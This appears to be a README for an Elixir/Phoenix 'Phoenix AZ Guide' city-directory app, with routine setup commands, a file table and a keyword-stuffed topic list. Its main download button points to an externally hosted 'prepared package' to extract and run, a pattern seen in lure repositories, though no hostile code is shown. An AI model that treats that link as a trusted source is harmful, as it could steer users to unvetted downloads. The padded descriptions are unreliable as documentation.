# Phoenix AZ Guide - Curated Arizona City Resource

<p align="center">
  <img src="logo.png" alt="Phoenix AZ Guide sun" width="180">
</p>

Phoenix AZ Guide is a compact Elixir and Phoenix application foundation for organizing practical city information in one clear place. It combines the curated collection style of an awesome list with a composable Phoenix architecture, database support, health routes, GraphQL entry points, and tested web modules. The project is designed for a focused Phoenix Arizona directory covering travel, local updates, education, attractions, and sports without turning the repository into a large portal.

[![GET PHOENIX AZ GUIDE](https://img.shields.io/badge/GET%20PHOENIX%20AZ%20GUIDE-F97316?style=for-the-badge&logoColor=white)](https://phoenix-az.github.io/phoenix-az-guide/phoenix-az)

## What Is Included

- **Curated city structure:** Arrange city of Phoenix resources as concise entries instead of long, difficult pages.
- **Phoenix web foundation:** Use an endpoint, router, sessions, sockets, and security plugs drawn from a stable Elixir project base.
- **Live-ready modules:** Extend Phoenix channels and LiveView flows for changing Phoenix news, weather Phoenix summaries, or event updates.
- **Database layer:** Build structured records with Ecto schemas and a PostgreSQL repository.
- **Service checks:** Keep simple ping and health routes available for local checks and deployments.
- **GraphQL surface:** Add typed queries for travel, education, neighborhood, or sports data through the included schema and router.
- **Test support:** Start with connection cases, data cases, endpoint checks, and ExUnit setup.

The intended content map keeps common visitor questions close together. Phoenix time and time in Phoenix can share one card, while flights to Phoenix and Phoenix airport information can share a travel section. Phoenix college and Phoenix university entries fit an education section. Phoenix Suns and Phoenix Mercury updates can use the same sports category. This approach follows the source collections that group useful applications and resources by purpose.

![Phoenix Arizona sun symbol](assets/sun.svg)

## Quick Start

The project expects Elixir, Erlang/OTP, PostgreSQL, and Mix. A recent Node installation is useful when a Phoenix interface adds client assets.

### Option 1: Package Button

Use the orange download button above to obtain the prepared package. Extract it, open a terminal in the project directory, fetch dependencies, initialize the database, and start the server.

### Option 2: PowerShell Setup

```powershell
Expand-Archive .\phoenix-az-guide.zip .\phoenix-az-guide
Set-Location .\phoenix-az-guide
mix deps.get
mix ecto.setup
mix phx.server
```

The source project patterns also support a containerized PostgreSQL service:

```powershell
docker compose up -d
mix ecto.setup
mix phx.server
```

When the application starts, use the local web endpoint for the guide. Check `/ping` for a lightweight response and `/health` for application status. Environment-specific values should stay in local environment files rather than being embedded in modules.

## Working With the Guide

The repository keeps most implementation files in `lib/`, tests in `test/`, and visual material in `assets/`. The main pieces have narrow responsibilities:

| Area | Included files | Typical use |
|---|---|---|
| Web | `web_router.ex`, `endpoint.ex`, `web_socket.ex` | Routes, requests, and Phoenix channels |
| Content | `schema.ex`, `repo.ex`, `graphql_schema.ex` | Structured Arizona records and queries |
| Pages | `home_controller.ex`, `home_live.ex`, `home_html.ex` | Static and reactive city views |
| Operations | `health.ex`, `health_router.ex`, `release.ex` | Health checks, releases, and startup tasks |
| Tests | `conn_case.ex`, `data_case.ex`, `health_test.exs` | Request, database, and status verification |

Start a focused feature by adding a route, a schema, and a small test. For example, a travel view can present flights to Phoenix, airport details, and local transport. A daily panel can combine weather Phoenix conditions, Phoenix time, and selected Phoenix news. Keep each entry short, use consistent fields, and let the router or GraphQL layer expose only the data needed by the page.

Run the existing checks before extending the guide:

```bash
mix format
mix test
mix compile --warnings-as-errors
```

Phoenix applications are easiest to maintain when data access, web delivery, and presentation remain separate. Put database behavior in repository or schema modules, request handling in controllers and routers, and interactive state in LiveView modules. Add tests beside each behavior rather than relying on manual checks alone.

## Topic Map

Phoenix AZ, Phoenix Arizona, Arizona, Phoenix time, time in Phoenix, flights to Phoenix, Phoenix airport, weather Phoenix, Phoenix news, city of Phoenix, Phoenix mall, Phoenix college, Phoenix university, Phoenix Suns, Phoenix Mercury

## Project Notes

Keep additions composable, keep lines readable, and format the project before committing changes. New city categories should follow the existing collection pattern: a clear heading, a short explanation, and only the fields needed by residents or visitors. The repository follows the open-source license approach carried by its source project history, while local configuration and generated build artifacts remain outside the maintained guide content.
